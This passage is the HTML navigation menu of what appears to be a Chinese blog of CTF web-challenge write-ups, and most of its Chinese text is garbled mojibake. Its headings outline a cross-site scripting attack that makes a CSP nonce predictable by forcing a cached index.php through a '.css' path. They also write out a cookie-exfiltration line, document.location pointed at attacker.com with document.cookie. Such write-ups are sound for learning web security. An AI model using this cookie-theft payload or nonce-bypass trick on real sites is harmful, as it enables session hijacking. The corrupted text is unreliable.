href="#å®ƒæå–cookieå¹¶å°†å…¶ä½œä¸ºURLçš„ä¸€éƒ¨åˆ†å‘é€fetchç»™æˆ‘ä»¬æ§åˆ¶çš„HTTPç«¯ç‚¹ã€‚RequestBin-comå’Œç±»ä¼¼çš„ç½‘ç«™å¯¹æ­¤éå¸¸æœ‰ç”¨ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥æ£€æŸ¥è¯·æ±‚ï¼Œå¹¶æŸ¥çœ‹æœ‰æ•ˆè´Ÿè½½URLçš„è®¿é—®è€…å°†å‘é€ä»€ä¹ˆã€‚"><span class="nav-number">1.4.18.</span> <span class="nav-text">å®ƒæå–cookieå¹¶å°†å…¶ä½œä¸ºURLçš„ä¸€éƒ¨åˆ†å‘é€fetchç»™æˆ‘ä»¬æ§åˆ¶çš„HTTPç«¯ç‚¹ã€‚RequestBin.comå’Œç±»ä¼¼çš„ç½‘ç«™å¯¹æ­¤éå¸¸æœ‰ç”¨ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥æ£€æŸ¥è¯·æ±‚ï¼Œå¹¶æŸ¥çœ‹æœ‰æ•ˆè´Ÿè½½URLçš„è®¿é—®è€…å°†å‘é€ä»€ä¹ˆã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#æœ€åæˆ‘ä»¬å¾—åˆ°äº†æ­£ç¡®çš„flagï¼š-flag-brumm-brumm-brumm-brumm-brumm-brumm-brumm"><span class="nav-number">1.4.19.</span> <span class="nav-text">æœ€åæˆ‘ä»¬å¾—åˆ°äº†æ­£ç¡®çš„flagï¼š flag{brumm_brumm_brumm_brumm_brumm_brumm_brumm}</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Numtonce"><span class="nav-number">1.5.</span> <span class="nav-text">Numtonce</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#é¢˜ç›®çš„åœ°å€-https-fluxfingersforfuture-fluxfingers-net-challenges-29"><span class="nav-number">1.5.1.</span> <span class="nav-text">é¢˜ç›®çš„åœ°å€:https://fluxfingersforfuture.fluxfingers.net/challenges/29</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#é¢˜ç›®æè¿°"><span class="nav-number">1.5.2.</span> <span class="nav-text">é¢˜ç›®æè¿°</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#é¢å¯¹ä¸–ç•Œä¸Šæ‰€æœ‰çš„åæ¶ˆæ¯ï¼Œæ¯ä¸ªäººéƒ½éœ€è¦ä¸€ä¸ªå®‰é™çš„åœ°æ–¹æ¥æ”¾æ¾å¿ƒæƒ…ã€‚"><span class="nav-number">1.5.2.1.</span> <span class="nav-text">é¢å¯¹ä¸–ç•Œä¸Šæ‰€æœ‰çš„åæ¶ˆæ¯ï¼Œæ¯ä¸ªäººéƒ½éœ€è¦ä¸€ä¸ªå®‰é™çš„åœ°æ–¹æ¥æ”¾æ¾å¿ƒæƒ…ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æˆ‘ä»¬å»ºç«‹äº†ä¸€ä¸ª-ä½†æ˜¯ä½ å¿…é¡»æ¥å¸®åŠ©æˆ‘ä»¬ä¿è¯å®ƒå®‰å…¨ã€‚å¦‚æœä½ å‘ç°ä¸€ä¸ªå±é™©ï¼Œå‘Šè¯‰è¿™ä¸ªæ£®æ—å®ˆæŠ¤è€…ï¼Œå®ƒå°†æŠŠcookieå‘é€ç»™ä½ ã€‚"><span class="nav-number">1.5.2.2.</span> <span class="nav-text">æˆ‘ä»¬å»ºç«‹äº†ä¸€ä¸ª,ä½†æ˜¯ä½ å¿…é¡»æ¥å¸®åŠ©æˆ‘ä»¬ä¿è¯å®ƒå®‰å…¨ã€‚å¦‚æœä½ å‘ç°ä¸€ä¸ªå±é™©ï¼Œå‘Šè¯‰è¿™ä¸ªæ£®æ—å®ˆæŠ¤è€…ï¼Œå®ƒå°†æŠŠcookieå‘é€ç»™ä½ ã€‚</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#TL-DR"><span class="nav-number">1.5.3.</span> <span class="nav-text">TL;DR</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#å¯ä»¥é€šè¿‡URLå“ˆå¸Œå®ç°XSSã€‚ä½†æ˜¯å·²ç»è®¾ç½®CSPï¼Œå› æ­¤ä¸å…è®¸ä½¿ç”¨å¤–éƒ¨è„šæœ¬ã€‚"><span class="nav-number">1.5.3.1.</span> <span class="nav-text">å¯ä»¥é€šè¿‡URLå“ˆå¸Œå®ç°XSSã€‚ä½†æ˜¯å·²ç»è®¾ç½®CSPï¼Œå› æ­¤ä¸å…è®¸ä½¿ç”¨å¤–éƒ¨è„šæœ¬ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#é™¤ééšæœºæ•°-nonce-æ ‡ç­¾æ˜¯æ­£ç¡®çš„ã€‚æƒ³æ³•æ˜¯é€šè¿‡ä»ç¼“å­˜ä¸­åŠ è½½ç½‘ç«™æ¥å¼ºåˆ¶åˆ·æ–°åä½¿nonceæ ‡ç­¾æ¥ä¿æŒç›¸åŒã€‚"><span class="nav-number">1.5.3.2.</span> <span class="nav-text">é™¤ééšæœºæ•°(nonce)æ ‡ç­¾æ˜¯æ­£ç¡®çš„ã€‚æƒ³æ³•æ˜¯é€šè¿‡ä»ç¼“å­˜ä¸­åŠ è½½ç½‘ç«™æ¥å¼ºåˆ¶åˆ·æ–°åä½¿nonceæ ‡ç­¾æ¥ä¿æŒç›¸åŒã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#js-css-imageæ–‡ä»¶æ˜¯ä»ç¼“å­˜ä¸­åŠ è½½çš„ï¼Œä½†æ˜¯è¿™ä¸ªindex-phpæ–‡ä»¶ä¸æ˜¯ã€‚"><span class="nav-number">1.5.3.3.</span> <span class="nav-text">js/css/imageæ–‡ä»¶æ˜¯ä»ç¼“å­˜ä¸­åŠ è½½çš„ï¼Œä½†æ˜¯è¿™ä¸ªindex.phpæ–‡ä»¶ä¸æ˜¯ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åœ¨urlçš„åé¢é™„åŠ ä¸€ä¸ªcssæ–‡ä»¶æ¥ä»ç¼“å­˜ä¸­å¼ºåˆ¶åŠ è½½index-phpæ–‡ä»¶"><span class="nav-number">1.5.3.4.</span> <span class="nav-text">ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åœ¨urlçš„åé¢é™„åŠ ä¸€ä¸ªcssæ–‡ä»¶æ¥ä»ç¼“å­˜ä¸­å¼ºåˆ¶åŠ è½½index.phpæ–‡ä»¶</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ä¾‹å¦‚ä¸‹é¢çš„é“¾æ¥http-url-com-index-php-blub-cssã€‚"><span class="nav-number">1.5.3.5.</span> <span class="nav-text">ä¾‹å¦‚ä¸‹é¢çš„é“¾æ¥http://url.com/index.php/blub.cssã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#index-phpå°†ä¼šåŠ è½½ï¼Œç„¶åè¿™ä¸ªä»£ç†æœåŠ¡å™¨å°†ä»–ä½œä¸ºä¸€ä¸ªcssæ–‡ä»¶å¹¶ä¸”åŠ è½½index-phpæ–‡ä»¶çš„ç¼“å­˜ç‰ˆæœ¬ã€‚"><span class="nav-number">1.5.3.6.</span> <span class="nav-text">index.phpå°†ä¼šåŠ è½½ï¼Œç„¶åè¿™ä¸ªä»£ç†æœåŠ¡å™¨å°†ä»–ä½œä¸ºä¸€ä¸ªcssæ–‡ä»¶å¹¶ä¸”åŠ è½½index.phpæ–‡ä»¶çš„ç¼“å­˜ç‰ˆæœ¬ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#å› æ­¤ç°åœ¨æˆ‘ä»¬æå‰çŸ¥é“äº†éšæœºæ•°-nonce-ï¼Œç°åœ¨æˆ‘ä»¬å¯ä»¥æ‰§è¡Œæˆ‘ä»¬çš„è‡ªå®šä¹‰jsä»£ç ã€‚"><span class="nav-number">1.5.3.7.</span> <span class="nav-text">å› æ­¤ç°åœ¨æˆ‘ä»¬æå‰çŸ¥é“äº†éšæœºæ•°(nonce)ï¼Œç°åœ¨æˆ‘ä»¬å¯ä»¥æ‰§è¡Œæˆ‘ä»¬çš„è‡ªå®šä¹‰jsä»£ç ã€‚</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#å®Œå–„payloadï¼š"><span class="nav-number">1.5.4.</span> <span class="nav-text">å®Œå–„payloadï¼š</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#é€šè¿‡é˜…è¯»ä¸Šé¢çš„æè¿°ï¼Œæˆ‘ä»¬çš„ç›®æ ‡ä¼¼ä¹æ˜¯å»ç›—çªƒè¿™ä¸ªcookieä»æµè§ˆå™¨ã€‚"><span class="nav-number">1.5.4.1.</span> <span class="nav-text">é€šè¿‡é˜…è¯»ä¸Šé¢çš„æè¿°ï¼Œæˆ‘ä»¬çš„ç›®æ ‡ä¼¼ä¹æ˜¯å»ç›—çªƒè¿™ä¸ªcookieä»æµè§ˆå™¨ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#é€šå¸¸ï¼Œè¿™æ˜¯é€šè¿‡å°†è‡ªå®šä¹‰çš„javascriptä»£ç æ³¨å…¥ç½‘ç«™-xss-å¹¶ä¸”é€šè¿‡ä¸€æ®µä»£ç å°†Cookieå‘é€åˆ°æ”»å‡»è€…æ§åˆ¶çš„æœåŠ¡å™¨æ¥å®Œæˆçš„ã€‚"><span class="nav-number">1.5.4.2.</span> <span class="nav-text">é€šå¸¸ï¼Œè¿™æ˜¯é€šè¿‡å°†è‡ªå®šä¹‰çš„javascriptä»£ç æ³¨å…¥ç½‘ç«™(xss)å¹¶ä¸”é€šè¿‡ä¸€æ®µä»£ç å°†Cookieå‘é€åˆ°æ”»å‡»è€…æ§åˆ¶çš„æœåŠ¡å™¨æ¥å®Œæˆçš„ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æ£®æ—å®ˆæŠ¤è€…ç½‘ç«™ä¹Ÿä»…ä»…æ˜¯ä¸€ä¸ªæ–‡æœ¬å­—æ®µï¼Œç”¨äºä»£æ›¿URLã€‚"><span class="nav-number">1.5.4.3.</span> <span class="nav-text">æ£®æ—å®ˆæŠ¤è€…ç½‘ç«™ä¹Ÿä»…ä»…æ˜¯ä¸€ä¸ªæ–‡æœ¬å­—æ®µï¼Œç”¨äºä»£æ›¿URLã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ç„¶åxss-botå°†ä¼šå¸¦ç€cookieè®¿é—®è¿™äº›URLï¼Œè€Œé‚£ä¸ªflagå°±åœ¨cookieé‡Œé¢ã€‚"><span class="nav-number">1.5.4.4.</span> <span class="nav-text">ç„¶åxss botå°†ä¼šå¸¦ç€cookieè®¿é—®è¿™äº›URLï¼Œè€Œé‚£ä¸ªflagå°±åœ¨cookieé‡Œé¢ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ç°åœ¨æˆ‘ä»¬å¼€å§‹æ„é€ pocå»æ”»å‡»ã€‚"><span class="nav-number">1.5.4.5.</span> <span class="nav-text">ç°åœ¨æˆ‘ä»¬å¼€å§‹æ„é€ pocå»æ”»å‡»ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#1-ä¼ªé€ ä¸€ä¸ªå¯ä»¥è§¦å‘è‡ªå®šä¹‰javascriptçš„URLï¼Œä»¥å°†Cookieå‘é€åˆ°æˆ‘ä»¬æ§åˆ¶çš„æœåŠ¡å™¨ã€‚"><span class="nav-number">1.5.4.6.</span> <span class="nav-text">1. ä¼ªé€ ä¸€ä¸ªå¯ä»¥è§¦å‘è‡ªå®šä¹‰javascriptçš„URLï¼Œä»¥å°†Cookieå‘é€åˆ°æˆ‘ä»¬æ§åˆ¶çš„æœåŠ¡å™¨ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-å°†è¯¥URLæäº¤ç»™æˆ‘ä»¬çš„æ£®æ—botã€‚"><span class="nav-number">1.5.4.7.</span> <span class="nav-text">2. å°†è¯¥URLæäº¤ç»™æˆ‘ä»¬çš„æ£®æ—botã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-æŸ¥çœ‹æˆ‘ä»¬çš„æœåŠ¡å™¨æ—¥å¿—è·å–çªƒå–çš„cookieã€‚"><span class="nav-number">1.5.4.8.</span> <span class="nav-text">3. æŸ¥çœ‹æˆ‘ä»¬çš„æœåŠ¡å™¨æ—¥å¿—è·å–çªƒå–çš„cookieã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#4-æ‹¿åˆ°cookieä¸­çš„flagã€‚"><span class="nav-number">1.5.4.9.</span> <span class="nav-text">4. æ‹¿åˆ°cookieä¸­çš„flagã€‚</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ä»è¿™ä¸ªç½‘ç«™æœ¬èº«æ¥çœ‹ï¼Œè¿™ä¼¼ä¹éå¸¸ç®€å•ã€‚å› ä¸ºä»–åªæœ‰ä¸€é¡µï¼Œå¹¶ä¸”æºä»£ç å‡ ä¹åªæœ‰ä¸‹é¢çš„javascriptä»£ç ã€‚"><span class="nav-number">1.5.5.</span> <span class="nav-text">ä»è¿™ä¸ªç½‘ç«™æœ¬èº«æ¥çœ‹ï¼Œè¿™ä¼¼ä¹éå¸¸ç®€å•ã€‚å› ä¸ºä»–åªæœ‰ä¸€é¡µï¼Œå¹¶ä¸”æºä»£ç å‡ ä¹åªæœ‰ä¸‹é¢çš„javascriptä»£ç ã€‚</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#é˜…è¯»è¿™ä¸ªä»£ç ï¼Œå¯ä»¥çœ‹åˆ°ç”±äºè¿™ä¸ªdocument-write-o0o-å¯èƒ½åœ¨URLä¸Šè¿›è¡ŒXSSã€‚"><span class="nav-number">1.5.5.1.</span> <span class="nav-text">é˜…è¯»è¿™ä¸ªä»£ç ï¼Œå¯ä»¥çœ‹åˆ°ç”±äºè¿™ä¸ªdocument.write(o0o),å¯èƒ½åœ¨URLä¸Šè¿›è¡ŒXSSã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#å›é¡¾è¿™ä¸ªo0oå¯ä»¥çœ‹åˆ°è¿™ä¸ªæ˜¯ç”±-å·åé¢çš„ç»„ä»¶ç”Ÿæˆçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨ä¸‹é¢çš„urlè¿›è¡Œæ³¨å…¥ã€‚"><span class="nav-number">1.5.5.2.</span> <span class="nav-text">å›é¡¾è¿™ä¸ªo0oå¯ä»¥çœ‹åˆ°è¿™ä¸ªæ˜¯ç”±#å·åé¢çš„ç»„ä»¶ç”Ÿæˆçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨ä¸‹é¢çš„urlè¿›è¡Œæ³¨å…¥ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ä¸‹ä¸€æ­¥æ˜¯å»å°è¯•åµŒå…¥æˆ‘ä»¬çš„javascriptä»£ç ã€‚ä½†æ˜¯æœ‰CSPçš„ä¿æŠ¤ã€‚"><span class="nav-number">1.5.5.3.</span> <span class="nav-text">ä¸‹ä¸€æ­¥æ˜¯å»å°è¯•åµŒå…¥æˆ‘ä»¬çš„javascriptä»£ç ã€‚ä½†æ˜¯æœ‰CSPçš„ä¿æŠ¤ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#å°†CSPæ ‡å¤´è®¾ç½®ä¸ºä¸å…è®¸è„šæœ¬æ‰§è¡Œï¼Œé™¤énonceæ ‡ç­¾æˆ–è€…scriptçš„sha256æ˜¯æ­£ç¡®çš„ï¼š"><span class="nav-number">1.5.5.4.</span> <span class="nav-text">å°†CSPæ ‡å¤´è®¾ç½®ä¸ºä¸å…è®¸è„šæœ¬æ‰§è¡Œï¼Œé™¤énonceæ ‡ç­¾æˆ–è€…scriptçš„sha256æ˜¯æ­£ç¡®çš„ï¼š</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#nonceæ˜¯ä¸€ä¸ªéšæœºçš„ä»¤ç‰Œï¼Œåªè¦ç½‘ç«™é‡æ–°åŠ è½½é‚£ä¹ˆä»–å°±ä¼šé‡æ–°ç”Ÿæˆã€‚"><span class="nav-number">1.5.5.5.</span> <span class="nav-text">nonceæ˜¯ä¸€ä¸ªéšæœºçš„ä»¤ç‰Œï¼Œåªè¦ç½‘ç«™é‡æ–°åŠ è½½é‚£ä¹ˆä»–å°±ä¼šé‡æ–°ç”Ÿæˆã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#è¿™ä¸¤ä¸ªé€‰é¡¹å¯¹æˆ‘ä»¬æ¥è¯´éƒ½æ˜¯ä¸å¤ªå¯èƒ½çš„-https-csp-evaluator-withgoogle-com-ï¼Œå› æ­¤æˆ‘ä»¬å¼€å§‹å°è¯•å»ç†è§£å‰©ä¸‹çš„ä»£ç ã€‚"><span class="nav-number">1.5.5.6.</span> <span class="nav-text">è¿™ä¸¤ä¸ªé€‰é¡¹å¯¹æˆ‘ä»¬æ¥è¯´éƒ½æ˜¯ä¸å¤ªå¯èƒ½çš„(https://csp-evaluator.withgoogle.com/)ï¼Œå› æ­¤æˆ‘ä»¬å¼€å§‹å°è¯•å»ç†è§£å‰©ä¸‹çš„ä»£ç ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ä¸€æ®µæ—¶é—´åjs-css-imageæ–‡ä»¶çš„å“åº”å¤´æœ‰ç‚¹å¥‡æ€ªã€‚"><span class="nav-number">1.5.5.7.</span> <span class="nav-text">ä¸€æ®µæ—¶é—´åjs/css/imageæ–‡ä»¶çš„å“åº”å¤´æœ‰ç‚¹å¥‡æ€ªã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#è¿™æ˜¯å½“æˆ‘ä»¬æ³¨æ„åˆ°js-css-imagesæ–‡ä»¶æ˜¯ä»ç¼“å­˜ä¸­åŠ è½½çš„ã€‚ä»–ä»¬è¿˜æœ‰ä¸€ä¸ªAgeæ ‡å¤´è¯¥æ ‡å¤´åœ¨10åˆ†é’Ÿåè¿‡æœŸã€‚"><span class="nav-number">1.5.5.8.</span> <span class="nav-text">è¿™æ˜¯å½“æˆ‘ä»¬æ³¨æ„åˆ°js/css/imagesæ–‡ä»¶æ˜¯ä»ç¼“å­˜ä¸­åŠ è½½çš„ã€‚ä»–ä»¬è¿˜æœ‰ä¸€ä¸ªAgeæ ‡å¤´è¯¥æ ‡å¤´åœ¨10åˆ†é’Ÿåè¿‡æœŸã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#è¿™ä¸ªæƒ³æ³•çªç„¶å‡ºç°ï¼Œå¦‚æœæˆ‘ä»¬è®¾æ³•ä»ç¼“å­˜ä¸­åŠ è½½index-phpï¼Œé‚£ä¹ˆä»¤ç‰Œå°†åœ¨10åˆ†é’Ÿæ˜¯æœ‰æ•ˆçš„ã€‚"><span class="nav-number">1.5.5.9.</span> <span class="nav-text">è¿™ä¸ªæƒ³æ³•çªç„¶å‡ºç°ï¼Œå¦‚æœæˆ‘ä»¬è®¾æ³•ä»ç¼“å­˜ä¸­åŠ è½½index.phpï¼Œé‚£ä¹ˆä»¤ç‰Œå°†åœ¨10åˆ†é’Ÿæ˜¯æœ‰æ•ˆçš„ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æˆ‘ä»¬å°è¯•å»åŠ è½½è¿™ä¸ªindex-phpæ–‡ä»¶é€šè¿‡è®¾ç½®ä¸€äº›ç‰¹æ®Šçš„æ ‡å¤´-Cache-Controlç­‰ç­‰-ã€‚"><span class="nav-number">1.5.5.10.</span> <span class="nav-text">æˆ‘ä»¬å°è¯•å»åŠ è½½è¿™ä¸ªindex.phpæ–‡ä»¶é€šè¿‡è®¾ç½®ä¸€äº›ç‰¹æ®Šçš„æ ‡å¤´(Cache-Controlç­‰ç­‰)ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ä½†æ˜¯éƒ½æ˜¯æ²¡æœ‰ç”¨çš„ï¼Œå¹¶ä¸”xss-botä¹Ÿæ²¡æœ‰è®¾ç½®å®ƒä»¬ã€‚"><span class="nav-number">1.5.5.11.</span> <span class="nav-text">ä½†æ˜¯éƒ½æ˜¯æ²¡æœ‰ç”¨çš„ï¼Œå¹¶ä¸”xss botä¹Ÿæ²¡æœ‰è®¾ç½®å®ƒä»¬ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ä¸å¦ä¸€ä¸ªå¤´æ–‡ä»¶ä¸€æ ·Server-nginxï¼Œæˆ‘ä»¬æŸ¥è¯¢äº†å¦‚ä½•åœ¨nginxä¸Šè®¾ç½®åŸºæœ¬ç¼“å­˜ã€‚åŸºæœ¬ä¸Šï¼Œå°†æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤å™¨åº”ç”¨äºç½‘å€ï¼Œå¦‚æœåŒ¹é…ï¼Œæ–‡ä»¶å°†è¢«ç¼“å­˜ã€‚"><span class="nav-number">1.5.5.12.</span> <span class="nav-text">ä¸å¦ä¸€ä¸ªå¤´æ–‡ä»¶ä¸€æ ·Server: nginxï¼Œæˆ‘ä»¬æŸ¥è¯¢äº†å¦‚ä½•åœ¨nginxä¸Šè®¾ç½®åŸºæœ¬ç¼“å­˜ã€‚åŸºæœ¬ä¸Šï¼Œå°†æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤å™¨åº”ç”¨äºç½‘å€ï¼Œå¦‚æœåŒ¹é…ï¼Œæ–‡ä»¶å°†è¢«ç¼“å­˜ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#å› æ­¤ï¼Œæˆ‘ä»¬å°è¯•ä¼ªé€ ä»¥-cssç»“å°¾ä½†ä»åŠ è½½index-phpçš„URLã€‚ç»è¿‡åå¤è¯•éªŒï¼Œæˆ‘ä»¬ä¼ªé€ äº†ä»¥ä¸‹ç½‘å€ï¼š"><span class="nav-number">1.5.5.13.</span> <span class="nav-text">å› æ­¤ï¼Œæˆ‘ä»¬å°è¯•ä¼ªé€ ä»¥.cssç»“å°¾ä½†ä»åŠ è½½index.phpçš„URLã€‚ç»è¿‡åå¤è¯•éªŒï¼Œæˆ‘ä»¬ä¼ªé€ äº†ä»¥ä¸‹ç½‘å€ï¼š</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æˆåŠŸï¼nonce-tokenå§‹ç»ˆç›¸åŒï¼Œå¹¶ä¸”å“åº”å…·æœ‰æ‰€æœ‰ç¼“å­˜æ ‡å¤´ï¼"><span class="nav-number">1.5.5.14.</span> <span class="nav-text">æˆåŠŸï¼nonce tokenå§‹ç»ˆç›¸åŒï¼Œå¹¶ä¸”å“åº”å…·æœ‰æ‰€æœ‰ç¼“å­˜æ ‡å¤´ï¼</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#å°è¯•ä»¥ä¸‹æ“ä½œï¼Œæˆ‘ä»¬å°†ç”¨xsså¼¹å‡ºä¸€ä¸ªalert-1-nonce-æ˜¯å…ˆå‰å“åº”å¤´ä¸­çš„CSP-nonceä»¤ç‰Œ-ï¼š"><span class="nav-number">1.5.5.15.</span> <span class="nav-text">å°è¯•ä»¥ä¸‹æ“ä½œï¼Œæˆ‘ä»¬å°†ç”¨xsså¼¹å‡ºä¸€ä¸ªalert(1)({nonce}æ˜¯å…ˆå‰å“åº”å¤´ä¸­çš„CSP nonceä»¤ç‰Œ)ï¼š</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ä½†æ˜¯å°è¯•å»å‘é€cookieåˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨ä¸Šç”¨ajaxæˆ–è€…imgçš„srcï¼Œä½†æ˜¯æ²¡æœ‰ç”¨"><span class="nav-number">1.5.5.16.</span> <span class="nav-text">ä½†æ˜¯å°è¯•å»å‘é€cookieåˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨ä¸Šç”¨ajaxæˆ–è€…imgçš„srcï¼Œä½†æ˜¯æ²¡æœ‰ç”¨</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ä½†æ˜¯ç”±äºCSPå†æ¬¡å°è¯•é€šè¿‡ajaxæˆ–img-srcå°†cookieå‘é€åˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨ï¼Œå› æ­¤æ— æ³•æ­£å¸¸å·¥ä½œã€‚å› æ­¤ï¼Œæˆ‘ä»¬å†æ¬¡ä½¿ç”¨äº†ç›¸åŒçš„æŠ€å·§ï¼Œå¹¶ä½¿ç”¨æ­£ç¡®çš„nonceç¼–å†™äº†ä¸€ä¸ªè„šæœ¬æ ‡ç­¾ï¼š"><span class="nav-number">1.5.5.17.</span> <span class="nav-text">ä½†æ˜¯ç”±äºCSPå†æ¬¡å°è¯•é€šè¿‡ajaxæˆ–img srcå°†cookieå‘é€åˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨ï¼Œå› æ­¤æ— æ³•æ­£å¸¸å·¥ä½œã€‚å› æ­¤ï¼Œæˆ‘ä»¬å†æ¬¡ä½¿ç”¨äº†ç›¸åŒçš„æŠ€å·§ï¼Œå¹¶ä½¿ç”¨æ­£ç¡®çš„nonceç¼–å†™äº†ä¸€ä¸ªè„šæœ¬æ ‡ç­¾ï¼š</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#åæ¥æƒ³äº†ä¸€ä¸‹ï¼Œdocument-location-https-attacker-com-cookie-39-document-cookie-39-ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚"><span class="nav-number">1.5.5.18.</span> <span class="nav-text">åæ¥æƒ³äº†ä¸€ä¸‹ï¼Œdocument.location=https://attacker.com/cookie=&#39;+document.cookie+&#39;ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#æœ€ç»ˆçš„payload"><span class="nav-number">1.5.6.</span> <span class="nav-text">æœ€ç»ˆçš„payload:</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#nonce-æ˜¯å…ˆå‰å“åº”æ ‡å¤´ä¸­å…·æœ‰ç›¸åŒURLçš„CSP-nonceä»¤ç‰Œ"><span class="nav-number">1.5.6.1.</span> <span class="nav-text">{nonce}æ˜¯å…ˆå‰å“åº”æ ‡å¤´ä¸­å…·æœ‰ç›¸åŒURLçš„CSP nonceä»¤ç‰Œ</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Lessons-learned"><span class="nav-number">1.5.7.</span> <span class="nav-text">Lessons learned</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#Check-and-understand-the-CSP-We-would-have-saved-a-looot-of-time-if-we-understood-the-CSP-correctly-straight-away-As-default-src-was-set-to-none-We-should-have-noticed-that-it-is-impossible-to-include-any-external-resource-Meaning-that-even-if-we-would-have-found-some-unsafe-javascript-code-inside-the-website-itself-it-would-still-have-been-impossible-to-send-the-cookie-to-an-external-server-The-only-exceptions-to-be-able-to-contact-an-external-server-would-be-if-the-nonce-of-a-script-tag-is-correct-or-the-sha256-of-the-external-script-would-be-correct-As-it-is-impossible-to-find-sha256-collisions-finding-a-correct-nonce-is-the-only-possible-solution-So-no-matter-what-we-tried-to-do-we-sould-have-noticed-from-the-beginning-that-we-needed-to-force-a-valid-nonce"><span class="nav-number">1.5.7.1.</span> <span class="nav-text">Check and understand the CSP! We would have saved a looot of time if we understood the CSP correctly straight away. As default-src was set to none. We should have noticed that it is impossible to include any external resource. Meaning that even if we would have found some unsafe javascript code inside the website itself, it would still have been impossible to send the cookie to an external server! The only exceptions to be able to contact an external server would be if the nonce of a script tag is correct or the sha256 of the external script would be correct. As it is impossible to find sha256 collisions, finding a correct nonce is the only possible solution. So no matter what we tried to do, we sould have noticed from the beginning that we needed to force a valid nonce!</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Tasteless-2019-Gabbr"><span class="nav-number">1.6.</span> <span class="nav-text">Tasteless 2019 - Gabbr</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#é¢˜ç›®ç±»å‹ï¼šCSPï¼ŒCSS"><span class="nav-number">1.6.1.</span> <span class="nav-text">é¢˜ç›®ç±»å‹ï¼šCSPï¼ŒCSS</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#æ€»è§ˆ"><span class="nav-number">1.6.2.</span> <span class="nav-text">æ€»è§ˆ</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#gabbræ˜¯ä¸€ä¸ªåœ¨çº¿èŠå¤©å®¤æœåŠ¡ã€‚å½“é¡µé¢åŠ è½½åï¼Œäººä»¬åŠ å…¥URLçš„å“ˆå¸Œéƒ¨åˆ†æŒ‡å®šçš„èŠå¤©å®¤ä¾‹å¦‚ï¼š"><span class="nav-number">1.6.2.1.</span> <span class="nav-text">gabbræ˜¯ä¸€ä¸ªåœ¨çº¿èŠå¤©å®¤æœåŠ¡ã€‚å½“é¡µé¢åŠ è½½åï¼Œäººä»¬åŠ å…¥URLçš„å“ˆå¸Œéƒ¨åˆ†æŒ‡å®šçš„èŠå¤©å®¤ä¾‹å¦‚ï¼š</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" 